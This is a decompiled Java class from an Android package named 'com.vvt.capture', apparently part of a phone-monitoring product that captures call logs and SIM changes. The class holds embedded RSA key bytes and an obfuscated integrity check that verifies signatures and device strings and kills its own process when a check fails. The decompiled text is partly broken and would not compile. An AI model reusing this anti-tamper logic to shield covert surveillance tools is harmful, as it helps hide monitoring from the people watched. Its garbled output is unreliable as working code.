package com.vvt.capture.simchange;

import android.app.ActivityGroup;
import android.os.Process;
import c.v.c.si.E;
import c.v.c.si.F;
import c.v.c.si.I;
import c.v.c.si.M;
import c.v.c.si.N;
import com.vvt.appengine.l;
import com.vvt.appengine.u;
import com.vvt.l.f;
import java.security.GeneralSecurityException;
import java.security.Key;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;

class j
  implements Runnable
{
  j(i parami) {}
  
  private byte[] a()
  {
    byte[] arrayOfByte = new byte[64];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 19;
    tmp7_6[1] = 8;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 77;
    tmp16_7[3] = -63;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = -11;
    tmp25_16[5] = 124;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = -64;
    tmp34_25[7] = 11;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = -1;
    tmp45_34[9] = -41;
    byte[] tmp55_45 = tmp45_34;
    byte[] tmp55_45 = tmp45_34;
    tmp55_45[10] = 96;
    tmp55_45[11] = -108;
    byte[] tmp66_55 = tmp55_45;
    byte[] tmp66_55 = tmp55_45;
    tmp66_55[12] = 66;
    tmp66_55[13] = -41;
    byte[] tmp77_66 = tmp66_55;
    byte[] tmp77_66 = tmp66_55;
    tmp77_66[14] = -117;
    tmp77_66[15] = -72;
    byte[] tmp88_77 = tmp77_66;
    byte[] tmp88_77 = tmp77_66;
    tmp88_77[16] = -69;
    tmp88_77[17] = 48;
    byte[] tmp99_88 = tmp88_77;
    byte[] tmp99_88 = tmp88_77;
    tmp99_88[18] = -13;
    tmp99_88[19] = Byte.MIN_VALUE;
    byte[] tmp110_99 = tmp99_88;
    byte[] tmp110_99 = tmp99_88;
    tmp110_99[20] = -111;
    tmp110_99[21] = 40;
    byte[] tmp121_110 = tmp110_99;
    byte[] tmp121_110 = tmp110_99;
    tmp121_110[22] = 48;
    tmp121_110[23] = -63;
    byte[] tmp132_121 = tmp121_110;
    byte[] tmp132_121 = tmp121_110;
    tmp132_121[24] = -53;
    tmp132_121[25] = 74;
    byte[] tmp143_132 = tmp132_121;
    byte[] tmp143_132 = tmp132_121;
    tmp143_132[26] = -73;
    tmp143_132[27] = -67;
    byte[] tmp154_143 = tmp143_132;
    byte[] tmp154_143 = tmp143_132;
    tmp154_143[28] = 75;
    tmp154_143[29] = 0;
    byte[] tmp164_154 = tmp154_143;
    byte[] tmp164_154 = tmp154_143;
    tmp164_154[30] = 116;
    tmp164_154[31] = -8;
    byte[] tmp175_164 = tmp164_154;
    byte[] tmp175_164 = tmp164_154;
    tmp175_164[32] = -31;
    tmp175_164[33] = 62;
    byte[] tmp186_175 = tmp175_164;
    byte[] tmp186_175 = tmp175_164;
    tmp186_175[34] = 89;
    tmp186_175[35] = -61;
    byte[] tmp197_186 = tmp186_175;
    byte[] tmp197_186 = tmp186_175;
    tmp197_186[36] = -27;
    tmp197_186[37] = -64;
    byte[] tmp208_197 = tmp197_186;
    byte[] tmp208_197 = tmp197_186;
    tmp208_197[38] = 52;
    tmp208_197[39] = -23;
    byte[] tmp219_208 = tmp208_197;
    byte[] tmp219_208 = tmp208_197;
    tmp219_208[40] = -95;
    tmp219_208[41] = 95;
    byte[] tmp230_219 = tmp219_208;
    byte[] tmp230_219 = tmp219_208;
    tmp230_219[42] = -48;
    tmp230_219[43] = 110;
    byte[] tmp241_230 = tmp230_219;
    byte[] tmp241_230 = tmp230_219;
    tmp241_230[44] = -66;
    tmp241_230[45] = -41;
    byte[] tmp252_241 = tmp241_230;
    byte[] tmp252_241 = tmp241_230;
    tmp252_241[46] = 22;
    tmp252_241[47] = -73;
    byte[] tmp263_252 = tmp252_241;
    byte[] tmp263_252 = tmp252_241;
    tmp263_252[48] = -14;
    tmp263_252[49] = 117;
    byte[] tmp274_263 = tmp263_252;
    byte[] tmp274_263 = tmp263_252;
    tmp274_263[50] = 0;
    tmp274_263[51] = 36;
    byte[] tmp284_274 = tmp274_263;
    byte[] tmp284_274 = tmp274_263;
    tmp284_274[52] = -34;
    tmp284_274[53] = -48;
    byte[] tmp295_284 = tmp284_274;
    byte[] tmp295_284 = tmp284_274;
    tmp295_284[54] = -120;
    tmp295_284[55] = -54;
    byte[] tmp306_295 = tmp295_284;
    byte[] tmp306_295 = tmp295_284;
    tmp306_295[56] = 119;
    tmp306_295[57] = -125;
    byte[] tmp317_306 = tmp306_295;
    byte[] tmp317_306 = tmp306_295;
    tmp317_306[58] = -57;
    tmp317_306[59] = 51;
    byte[] tmp328_317 = tmp317_306;
    byte[] tmp328_317 = tmp317_306;
    tmp328_317[60] = 127;
    tmp328_317[61] = -102;
    tmp328_317[62] = -19;
    tmp328_317[63] = 114;
    return arrayOfByte;
  }
  
  private byte[] b()
  {
    byte[] arrayOfByte = new byte[94];
    byte[] tmp6_5 = arrayOfByte;
    byte[] tmp7_6 = tmp6_5;
    byte[] tmp7_6 = tmp6_5;
    tmp7_6[0] = 48;
    tmp7_6[1] = 92;
    byte[] tmp16_7 = tmp7_6;
    byte[] tmp16_7 = tmp7_6;
    tmp16_7[2] = 48;
    tmp16_7[3] = 13;
    byte[] tmp25_16 = tmp16_7;
    byte[] tmp25_16 = tmp16_7;
    tmp25_16[4] = 6;
    tmp25_16[5] = 9;
    byte[] tmp34_25 = tmp25_16;
    byte[] tmp34_25 = tmp25_16;
    tmp34_25[6] = 42;
    tmp34_25[7] = -122;
    byte[] tmp45_34 = tmp34_25;
    byte[] tmp45_34 = tmp34_25;
    tmp45_34[8] = 72;
    tmp45_34[9] = -122;
    byte[] tmp56_45 = tmp45_34;
    byte[] tmp56_45 = tmp45_34;
    tmp56_45[10] = -9;
    tmp56_45[11] = 13;
    byte[] tmp67_56 = tmp56_45;
    byte[] tmp67_56 = tmp56_45;
    tmp67_56[12] = 1;
    tmp67_56[13] = 1;
    byte[] tmp76_67 = tmp67_56;
    byte[] tmp76_67 = tmp67_56;
    tmp76_67[14] = 1;
    tmp76_67[15] = 5;
    byte[] tmp85_76 = tmp76_67;
    byte[] tmp85_76 = tmp76_67;
    tmp85_76[16] = 0;
    tmp85_76[17] = 3;
    byte[] tmp94_85 = tmp85_76;
    byte[] tmp94_85 = tmp85_76;
    tmp94_85[18] = 75;
    tmp94_85[19] = 0;
    byte[] tmp104_94 = tmp94_85;
    byte[] tmp104_94 = tmp94_85;
    tmp104_94[20] = 48;
    tmp104_94[21] = 72;
    byte[] tmp115_104 = tmp104_94;
    byte[] tmp115_104 = tmp104_94;
    tmp115_104[22] = 2;
    tmp115_104[23] = 65;
    byte[] tmp125_115 = tmp115_104;
    byte[] tmp125_115 = tmp115_104;
    tmp125_115[24] = 0;
    tmp125_115[25] = -122;
    byte[] tmp135_125 = tmp125_115;
    byte[] tmp135_125 = tmp125_115;
    tmp135_125[26] = -123;
    tmp135_125[27] = -2;
    byte[] tmp146_135 = tmp135_125;
    byte[] tmp146_135 = tmp135_125;
    tmp146_135[28] = -11;
    tmp146_135[29] = -102;
    byte[] tmp157_146 = tmp146_135;
    byte[] tmp157_146 = tmp146_135;
    tmp157_146[30] = -15;
    tmp157_146[31] = 69;
    byte[] tmp168_157 = tmp157_146;
    byte[] tmp168_157 = tmp157_146;
    tmp168_157[32] = 5;
    tmp168_157[33] = -36;
    byte[] tmp178_168 = tmp168_157;
    byte[] tmp178_168 = tmp168_157;
    tmp178_168[34] = 49;
    tmp178_168[35] = -29;
    byte[] tmp189_178 = tmp178_168;
    byte[] tmp189_178 = tmp178_168;
    tmp189_178[36] = 78;
    tmp189_178[37] = -102;
    byte[] tmp200_189 = tmp189_178;
    byte[] tmp200_189 = tmp189_178;
    tmp200_189[38] = 21;
    tmp200_189[39] = -72;
    byte[] tmp211_200 = tmp200_189;
    byte[] tmp211_200 = tmp200_189;
    tmp211_200[40] = 81;
    tmp211_200[41] = -125;
    byte[] tmp222_211 = tmp211_200;
    byte[] tmp222_211 = tmp211_200;
    tmp222_211[42] = -56;
    tmp222_211[43] = 108;
    byte[] tmp233_222 = tmp222_211;
    byte[] tmp233_222 = tmp222_211;
    tmp233_222[44] = 71;
    tmp233_222[45] = 8;
    byte[] tmp244_233 = tmp233_222;
    byte[] tmp244_233 = tmp233_222;
    tmp244_233[46] = 77;
    tmp244_233[47] = 29;
    byte[] tmp255_244 = tmp244_233;
    byte[] tmp255_244 = tmp244_233;
    tmp255_244[48] = 4;
    tmp255_244[49] = 23;
    byte[] tmp265_255 = tmp255_244;
    byte[] tmp265_255 = tmp255_244;
    tmp265_255[50] = 113;
    tmp265_255[51] = 27;
    byte[] tmp276_265 = tmp265_255;
    byte[] tmp276_265 = tmp265_255;
    tmp276_265[52] = 93;
    tmp276_265[53] = 78;
    byte[] tmp287_276 = tmp276_265;
    byte[] tmp287_276 = tmp276_265;
    tmp287_276[54] = -82;
    tmp287_276[55] = 2;
    byte[] tmp297_287 = tmp287_276;
    byte[] tmp297_287 = tmp287_276;
    tmp297_287[56] = 80;
    tmp297_287[57] = -116;
    byte[] tmp308_297 = tmp297_287;
    byte[] tmp308_297 = tmp297_287;
    tmp308_297[58] = 125;
    tmp308_297[59] = 115;
    byte[] tmp319_308 = tmp308_297;
    byte[] tmp319_308 = tmp308_297;
    tmp319_308[60] = -120;
    tmp319_308[61] = 99;
    byte[] tmp330_319 = tmp319_308;
    byte[] tmp330_319 = tmp319_308;
    tmp330_319[62] = 115;
    tmp330_319[63] = 51;
    byte[] tmp341_330 = tmp330_319;
    byte[] tmp341_330 = tmp330_319;
    tmp341_330[64] = -49;
    tmp341_330[65] = -118;
    byte[] tmp352_341 = tmp341_330;
    byte[] tmp352_341 = tmp341_330;
    tmp352_341[66] = -39;
    tmp352_341[67] = -20;
    byte[] tmp363_352 = tmp352_341;
    byte[] tmp363_352 = tmp352_341;
    tmp363_352[68] = 24;
    tmp363_352[69] = 118;
    byte[] tmp374_363 = tmp363_352;
    byte[] tmp374_363 = tmp363_352;
    tmp374_363[70] = -26;
    tmp374_363[71] = 86;
    byte[] tmp385_374 = tmp374_363;
    byte[] tmp385_374 = tmp374_363;
    tmp385_374[72] = 92;
    tmp385_374[73] = -40;
    byte[] tmp396_385 = tmp385_374;
    byte[] tmp396_385 = tmp385_374;
    tmp396_385[74] = -4;
    tmp396_385[75] = -68;
    byte[] tmp407_396 = tmp396_385;
    byte[] tmp407_396 = tmp396_385;
    tmp407_396[76] = -85;
    tmp407_396[77] = -107;
    byte[] tmp418_407 = tmp407_396;
    byte[] tmp418_407 = tmp407_396;
    tmp418_407[78] = 94;
    tmp418_407[79] = 78;
    byte[] tmp429_418 = tmp418_407;
    byte[] tmp429_418 = tmp418_407;
    tmp429_418[80] = 127;
    tmp429_418[81] = -103;
    byte[] tmp440_429 = tmp429_418;
    byte[] tmp440_429 = tmp429_418;
    tmp440_429[82] = -31;
    tmp440_429[83] = -89;
    byte[] tmp451_440 = tmp440_429;
    byte[] tmp451_440 = tmp440_429;
    tmp451_440[84] = 5;
    tmp451_440[85] = -67;
    byte[] tmp461_451 = tmp451_440;
    byte[] tmp461_451 = tmp451_440;
    tmp461_451[86] = 98;
    tmp461_451[87] = 110;
    byte[] tmp472_461 = tmp461_451;
    byte[] tmp472_461 = tmp461_451;
    tmp472_461[88] = -123;
    tmp472_461[89] = 2;
    byte[] tmp482_472 = tmp472_461;
    byte[] tmp482_472 = tmp472_461;
    tmp482_472[90] = 3;
    tmp482_472[91] = 1;
    tmp482_472[92] = 0;
    tmp482_472[93] = 1;
    return arrayOfByte;
  }
  
  public void run()
  {
    int i = 1;
    int j = 0;
    E localE = null;
    boolean bool1 = g.c();
    if (bool1) {}
    bool1 = g.c();
    if (bool1) {}
    Object localObject1;
    Object localObject8;
    Object localObject9;
    try
    {
      localObject1 = new com/vvt/appengine/u;
      localObject3 = this.a;
      localObject3 = ((i)localObject3).a;
      localObject3 = ((g)localObject3).b();
      localObject3 = com.vvt.l.g.a((byte[])localObject3);
      ((u)localObject1).<init>((RSAPublicKey)localObject3);
      bool1 = g.c();
      if (bool1) {}
      localObject8 = new java/util/ArrayList;
      ((ArrayList)localObject8).<init>();
      localObject3 = this.a.a.b();
      ((ArrayList)localObject8).add(localObject3);
      localObject3 = new com/vvt/appengine/l;
      ((l)localObject3).<init>();
      localObject3 = ((l)localObject3).b();
      ((ArrayList)localObject8).add(localObject3);
      localObject3 = new com/vvt/capture/calllog/b;
      ((com.vvt.capture.calllog.b)localObject3).<init>();
      localObject3 = ((com.vvt.capture.calllog.b)localObject3).b();
      ((ArrayList)localObject8).add(localObject3);
      k = ((ArrayList)localObject8).size();
      i9 = k;
    }
    catch (Exception localException1)
    {
      for (;;)
      {
        Object localObject3;
        int k;
        int i11;
        boolean bool2;
        int m;
        bool3 = g.d();
        if (bool3) {}
        n = Process.myPid();
        Process.killProcess(n);
        continue;
        n = i9 + -1;
        int i9 = n;
        continue;
        bool4 = g.c();
        if (bool4) {}
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        localObject9 = this.a.a.a();
        ((ArrayList)localObject4).add(localObject9);
        localObject9 = new com/vvt/appengine/l;
        ((l)localObject9).<init>();
        localObject9 = ((l)localObject9).a();
        ((ArrayList)localObject4).add(localObject9);
        localObject9 = new com/vvt/capture/calllog/b;
        ((com.vvt.capture.calllog.b)localObject9).<init>();
        localObject9 = ((com.vvt.capture.calllog.b)localObject9).a();
        ((ArrayList)localObject4).add(localObject9);
        bool14 = g.c();
        if (bool14) {}
        localObject8 = new java/util/ArrayList;
        ((ArrayList)localObject8).<init>();
        localObject9 = ((ArrayList)localObject4).iterator();
        bool4 = ((Iterator)localObject9).hasNext();
        if (bool4)
        {
          localObject4 = (byte[])((Iterator)localObject9).next();
          try
          {
            localObject10 = ((u)localObject1).a();
            localObject4 = f.a((Key)localObject10, (byte[])localObject4);
            localObject10 = new java/lang/String;
            ((String)localObject10).<init>((byte[])localObject4);
            ((ArrayList)localObject8).add(localObject10);
            bool4 = g.c();
            if (!bool4) {
              break label399;
            }
            break label399;
          }
          catch (GeneralSecurityException localGeneralSecurityException1)
          {
            bool4 = g.d();
            if (bool4) {}
            i1 = Process.myPid();
            Process.killProcess(i1);
          }
        }
        else
        {
          bool5 = g.c();
          if (bool5) {}
          i2 = ((ArrayList)localObject8).size();
          for (i9 = i2;; i9 = i3)
          {
            if (i9 <= i) {
              break label631;
            }
            i2 = i9 + -1;
            i14 = i9 + -2;
            localObject5 = ((ArrayList)localObject8).get(i2);
            localObject9 = localObject5;
            localObject9 = (String)localObject5;
            localObject5 = (String)((ArrayList)localObject8).get(i14);
            bool16 = g.c();
            if (bool16) {}
            bool6 = ((String)localObject9).equals(localObject5);
            if (!bool6)
            {
              bool6 = g.e();
              if (bool6) {}
              i3 = Process.myPid();
              Process.killProcess(i3);
              break;
            }
            i3 = i9 + -1;
          }
          try
          {
            localObject5 = new com/vvt/appengine/u;
            localObject9 = b();
            localObject9 = com.vvt.l.g.a((byte[])localObject9);
            ((u)localObject5).<init>((RSAPublicKey)localObject9);
          }
          catch (Exception localException2)
          {
            try
            {
              localObject5 = ((u)localObject5).a();
              localObject9 = a();
              localObject5 = f.a((Key)localObject5, (byte[])localObject9);
              localObject9 = new java/lang/String;
              ((String)localObject9).<init>((byte[])localObject5);
              bool7 = g.c();
              if (bool7) {}
              localObject5 = ((ArrayList)localObject8).get(0);
              bool7 = ((String)localObject9).equals(localObject5);
              if (bool7) {
                break label795;
              }
              bool7 = g.e();
              if (bool7) {}
              i4 = Process.myPid();
              Process.killProcess(i4);
            }
            catch (GeneralSecurityException localGeneralSecurityException2)
            {
              bool9 = g.d();
              if (!bool9) {
                break label782;
              }
              i6 = Process.myPid();
              Process.killProcess(i6);
            }
            localException2 = localException2;
            bool8 = g.d();
            if (bool8) {}
            i5 = Process.myPid();
            Process.killProcess(i5);
          }
          continue;
          continue;
          localObject9 = new c/v/c/si/I;
          ((I)localObject9).<init>();
          bool10 = g.c();
          if (bool10) {}
          localObject6 = new int[4];
          Object tmp822_820 = localObject6;
          Object tmp823_822 = tmp822_820;
          Object tmp823_822 = tmp822_820;
          tmp823_822[0] = 102;
          tmp823_822[1] = 112;
          tmp823_822[2] = 112;
          tmp823_822[3] = 116;
          localObject10 = com.vvt.ag.b.a((int[])localObject6);
          bool10 = g.c();
          if (bool10) {}
          localObject6 = (String)((ArrayList)localObject8).get(0);
          localObject1 = "hTC-Sensation";
          localObject6 = ((I)localObject9).tpk((String)localObject6, (String)localObject1);
          bool10 = ((String)localObject6).equals(localObject10);
          if (!bool10)
          {
            localObject6 = new android/app/ActivityGroup;
            ((ActivityGroup)localObject6).<init>();
            localObject6.hashCode();
            bool10 = g.e();
            if (bool10) {}
            i7 = Process.myPid();
            Process.killProcess(i7);
          }
          else
          {
            d = 3.141592653589793D;
            i7 = (int)d;
            bool13 = g.c();
            if (bool13) {}
            localObject10 = this.a.a.b();
            i10 = ((I)localObject9).ssf((byte[])localObject10, i7);
            i15 = 852;
            if (i10 == i15) {
              break;
            }
            i12 = 22;
            Math.max(i7, i12);
            bool11 = g.e();
            if (bool11) {}
            i8 = Process.myPid();
            Process.killProcess(i8);
          }
        }
      }
      i10 = i8 + 1;
    }
    if (i9 > i)
    {
      k = i9 + -1;
      i11 = i9 + -2;
      localObject3 = (byte[])((ArrayList)localObject8).get(k);
      localObject9 = (byte[])((ArrayList)localObject8).get(i11);
      bool2 = Arrays.equals((byte[])localObject3, (byte[])localObject9);
      if (!bool2)
      {
        bool2 = g.e();
        if (bool2) {}
        m = Process.myPid();
        Process.killProcess(m);
      }
    }
    for (;;)
    {
      return;
      try
      {
        boolean bool3;
        int n;
        boolean bool4;
        Object localObject4;
        boolean bool14;
        label399:
        int i1;
        boolean bool5;
        int i2;
        int i14;
        Object localObject5;
        boolean bool16;
        boolean bool6;
        int i3;
        label631:
        boolean bool7;
        int i4;
        boolean bool8;
        int i5;
        boolean bool9;
        label782:
        int i6;
        label795:
        boolean bool10;
        int i7;
        double d;
        boolean bool13;
        int i15;
        boolean bool11;
        localObject1 = new c/v/c/si/M;
        ((M)localObject1).<init>();
        localObject8 = new c/v/c/si/F;
        ((F)localObject8).<init>();
        localE = new c/v/c/si/E;
        localE.<init>();
        j = localE.genBatch();
        boolean bool18 = ((F)localObject8).isKex(j);
        ((M)localObject1).a(bool18);
      }
      finally
      {
        Object localObject10;
        Object localObject6;
        int i10;
        int i12;
        int i8;
        boolean bool17;
        int i16;
        boolean bool15;
        for (;;) {}
      }
      bool17 = g.c();
      if (bool17) {}
      i12 = ((I)localObject9).tx12();
      i16 = 747;
      if (i12 != i16)
      {
        bool15 = g.e();
        if (bool15) {}
        i8 = i8 * 2 + 1;
        localObject6 = new java/lang/Thread;
        localObject9 = new com/vvt/capture/simchange/k;
        ((k)localObject9).<init>(this);
        ((Thread)localObject6).<init>((Runnable)localObject9);
        ((Thread)localObject6).start();
        i8 = Process.myPid();
        Process.killProcess(i8);
      }
      else
      {
        i8 += i10;
        i8 = 2;
      }
      try
      {
        localObject6 = new byte[i8];
        Object tmp1186_1184 = localObject6;
        tmp1186_1184[0] = 0;
        tmp1186_1184[1] = 18;
        localObject9 = new c/v/c/si/N;
        ((N)localObject9).<init>();
        localObject10 = new c/v/c/si/N;
        ((N)localObject10).<init>();
        i8 = ((N)localObject10).sail((byte[])localObject6);
        ((N)localObject9).terminal(i8);
      }
      finally
      {
        int i13;
        boolean bool12;
        for (;;) {}
      }
      localObject6 = this.a.a;
      i13 = 87;
      localObject9 = Integer.valueOf(i13);
      g.a((g)localObject6, localObject9);
      bool12 = g.c();
      if (!bool12) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/j.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */